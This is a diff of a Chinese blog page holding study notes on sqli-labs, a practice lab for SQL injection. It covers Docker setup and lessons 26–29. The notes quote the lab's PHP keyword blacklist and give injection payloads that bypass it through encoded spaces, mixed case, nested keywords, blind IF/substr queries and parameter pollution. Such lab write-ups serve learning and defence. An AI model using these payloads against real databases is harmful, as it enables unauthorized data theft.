@@ -8,17 +8,17 @@
   <link rel="dns-prefetch" href="http://yoursite.com">
   <title>notes on sqli-labs | Xun9er&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="把sqli-lab移到linux docker里了，前面那篇笔记太长了，看着烦，所以借此新开一篇。">
+  <meta name="description" content="把sqli-lab移到linux docker里了，前面那篇笔记太长了，看着烦，所以分开咯。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="notes on sqli-labs">
 <meta property="og:url" content="http://yoursite.com/2020/03/26/notes-on-sqli-labs/index.html">
 <meta property="og:site_name" content="Xun9er&#39;s blog">
-<meta property="og:description" content="把sqli-lab移到linux docker里了，前面那篇笔记太长了，看着烦，所以借此新开一篇。">
+<meta property="og:description" content="把sqli-lab移到linux docker里了，前面那篇笔记太长了，看着烦，所以分开咯。">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2020-03-26T01:40:52.108Z">
+<meta property="og:updated_time" content="2020-03-27T18:09:55.846Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="notes on sqli-labs">
-<meta name="twitter:description" content="把sqli-lab移到linux docker里了，前面那篇笔记太长了，看着烦，所以借此新开一篇。">
+<meta name="twitter:description" content="把sqli-lab移到linux docker里了，前面那篇笔记太长了，看着烦，所以分开咯。">
   
     <link rel="alternative" href="/atom.xml" title="Xun9er&#39;s blog" type="application/atom+xml">
   
@@ -191,7 +191,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
-        <span class="post-count">390字</span>
+        <span class="post-count">1.1k字</span>
       </span>
     </span>
 
@@ -200,7 +200,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">1分</span>
+        <span class="post-count">4分</span>
       </span>
     </span>
 </div>
@@ -211,14 +211,14 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p><em>把sqli-lab移到linux docker里了，前面那篇笔记太长了，看着烦，所以借此新开一篇。</em> </p>
+        <p><em>把sqli-lab移到linux docker里了，前面那篇笔记太长了，看着烦，所以分开咯。</em> </p>
 <a id="more"></a>
 <h1 id="docker搭建sqli-labs"><a href="#docker搭建sqli-labs" class="headerlink" title="docker搭建sqli-labs"></a>docker搭建sqli-labs</h1><p>1、docker search sqli-lab 查找sqli-labs 镜像</p>
 <p>2、docker pull acgpiano/sqli-labs 拉取镜像到本地</p>
 <p>3、docker images 查看已有的镜像</p>
 <p>4、docker run -dt –name sqli -p 80:80 –rm acgpiano/sqli-labs</p>
 <p>-dt 让其在后台运行<br>–name 给其命名<br>-p 本地端口：docker中的端口 是将docker的端口映射到本地端口<br>–rm 当其关闭后将删除开启的资源</p>
-<h1 id="less26"><a href="#less26" class="headerlink" title="less26"></a>less26</h1><p>首先判断闭合。<br>单引号报错，双引号不报。–&gt;单引号闭合<br>查询：</p>
+<h1 id="less26-（过滤-or-and-–-空格）"><a href="#less26-（过滤-or-and-–-空格）" class="headerlink" title="less26 （过滤 or and – # 空格）"></a>less26 （过滤 or and – # 空格）</h1><p>首先判断闭合。<br>单引号报错，双引号不报。–&gt;单引号闭合<br>查询：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
 
 <p>黑名单：  </p>
@@ -236,7 +236,15 @@
 <li>%0c 新的一页</li>
 <li>%0d return功能</li>
 <li>%0b TAB键（垂直）</li>
-<li>%a0 空格<br><code>?id=0%27%a0union%a0select%a01,database(),2||%271%27=%271</code><br>报表名用&amp;的编码（%26）来替换||：<br><code>?id=0%27union%a0select%a01,group_concat(table_name),3%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema=%27security%27%26%26%a0%271%27=%271</code></li>
+<li>%a0 回车<br><code>?id=0%27%a0union%a0select%a01,database(),2||%271%27=%271</code><br>报表名用&amp;的编码（%26）来替换||：<br><code>?id=0%27union%a0select%a01,group_concat(table_name),3%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema=%27security%27%26%26%a0%271%27=%271</code>  <h1 id="less27-过滤-注释符、空格、负号、select、union…"><a href="#less27-过滤-注释符、空格、负号、select、union…" class="headerlink" title="less27(过滤 注释符、空格、负号、select、union…)"></a>less27(过滤 注释符、空格、负号、select、union…)</h1></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">function blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">$id= preg_replace(&apos;/[\/\*]/&apos;,&quot;&quot;, $id);		//strip out /*</span><br><span class="line">$id= preg_replace(&apos;/[--]/&apos;,&quot;&quot;, $id);		//Strip out --.</span><br><span class="line">$id= preg_replace(&apos;/[#]/&apos;,&quot;&quot;, $id);			//Strip out #.</span><br><span class="line">$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);	    //Strip out spaces.</span><br><span class="line">$id= preg_replace(&apos;/select/m&apos;,&quot;&quot;, $id);	    //Strip out spaces.</span><br><span class="line">$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);	    //Strip out spaces.</span><br><span class="line">$id= preg_replace(&apos;/union/s&apos;,&quot;&quot;, $id);	    //Strip out union</span><br><span class="line">$id= preg_replace(&apos;/select/s&apos;,&quot;&quot;, $id);	    //Strip out select</span><br><span class="line">$id= preg_replace(&apos;/UNION/s&apos;,&quot;&quot;, $id);	    //Strip out UNION</span><br><span class="line">$id= preg_replace(&apos;/SELECT/s&apos;,&quot;&quot;, $id);	    //Strip out SELECT</span><br><span class="line">$id= preg_replace(&apos;/Union/s&apos;,&quot;&quot;, $id);	    //Strip out Union</span><br><span class="line">$id= preg_replace(&apos;/Select/s&apos;,&quot;&quot;, $id);	    //Strip out select</span><br><span class="line">return $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>空格–&gt;编码<br>关键字–&gt;大写<br><code>?id=0%27UniOn%a0SeleCt%a01,database(),1%a0and%a0%271%27=%271</code><br>此外这里也可以嵌套三个select来绕过，因为只是替换了两会，union同理。<br><code>?id=0%27%a0uniunionon%a0selseleselectctect%a01,database(),3%a0||%271</code>  </p>
+<h2 id="正则表达式匹配符"><a href="#正则表达式匹配符" class="headerlink" title="正则表达式匹配符"></a>正则表达式匹配符</h2><p>1、/g 表示该表达式将用来在输入字符串中查找所有可能的匹配，返回的结果可以是多个。如果不加/g最多只会匹配一个。<br>2、/i 表示匹配的时候不区分大小写，这个跟其它语言的正则用法相同。<br>3、/m 表示多行匹配。多行匹配就是匹配换行符两端的潜在匹配。影响正则中的^$符号。<br>4、/s 与/m相对，单行模式匹配。  s<br>5、/e 可执行模式，此为PHP专有参数，例如preg_replace函数。<br>6、/x 忽略空白模式。  </p>
+<h2 id="正则匹配单行模式、多行模式"><a href="#正则匹配单行模式、多行模式" class="headerlink" title="正则匹配单行模式、多行模式"></a>正则匹配单行模式、多行模式</h2><ul>
+<li>单行模式 s<br>主要改变了“.”（不能匹配”\n”）的意义，加上s后就可以匹配换行符了。  </li>
+<li>多行模式 m<br>多行模式下会改变^和$的含义【^和$是匹配整个字符串的开头和结尾】，使它在任意一行的行首和行尾进行匹配。<br>此外：在支持此模式的程序通常都提供\A和\Z两种修饰符，他们跟普通的^和$是一样的作用，但是^和$在多行模式下会改变含义，而\A和\Z他们的含义始终不会被改变，一直都匹配整个字符的开头和结尾。<br>实例参照：<a href="https://www.cnblogs.com/zengguowang/p/7998754.html" target="_blank" rel="noopener">正则表达式之单行模式、多行模式、区分大小写模式</a>  <h1 id="less28-过滤空格、select……的盲注"><a href="#less28-过滤空格、select……的盲注" class="headerlink" title="less28 过滤空格、select……的盲注"></a>less28 过滤空格、select……的盲注</h1><code>?id=1%27and%a01%a0or%27</code><br>用IF(expr1,expr2,expr3)<br><code>?id=1&#39;%09and%091=(select%09if(ascii(substr(database(),1,1))&gt;1,1,0))%09or&#39;</code><br>其他的没有太多。  <h1 id="less-29"><a href="#less-29" class="headerlink" title="less 29"></a>less 29</h1><code>id=-1&#39;union select 1,database(),2 or&#39;1&#39;=&#39;1</code><br>？？？<br>大概是了解一下参数污染（HTTP Parameter Pollution）绕waf的操作。<br>所谓参数污染就是说多次POST或GET传进去同一参数。而不同浏览器可能处理方式不一样。  </li>
 </ul>
 
       
@@ -360,7 +368,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#docker搭建sqli-labs"><span class="toc-number">1.</span> <span class="toc-text">docker搭建sqli-labs</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less26"><span class="toc-number">2.</span> <span class="toc-text">less26</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#docker搭建sqli-labs"><span class="toc-number">1.</span> <span class="toc-text">docker搭建sqli-labs</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less26-（过滤-or-and-–-空格）"><span class="toc-number">2.</span> <span class="toc-text">less26 （过滤 or and – # 空格）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less27-过滤-注释符、空格、负号、select、union…"><span class="toc-number">3.</span> <span class="toc-text">less27(过滤 注释符、空格、负号、select、union…)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#正则表达式匹配符"><span class="toc-number">3.1.</span> <span class="toc-text">正则表达式匹配符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正则匹配单行模式、多行模式"><span class="toc-number">3.2.</span> <span class="toc-text">正则匹配单行模式、多行模式</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less28-过滤空格、select……的盲注"><span class="toc-number">4.</span> <span class="toc-text">less28 过滤空格、select……的盲注</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-29"><span class="toc-number">5.</span> <span class="toc-text">less 29</span></a></li></ol>
                     </div>
                 </span>
             </div>
@@ -488,6 +496,14 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">ctf</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">sqli</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">kali配置</a>
               </li>
              
@@ -501,14 +517,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">sql注入</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">ctf</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">sqli</a>
               </li>
             
             <div class="clearfix"></div>
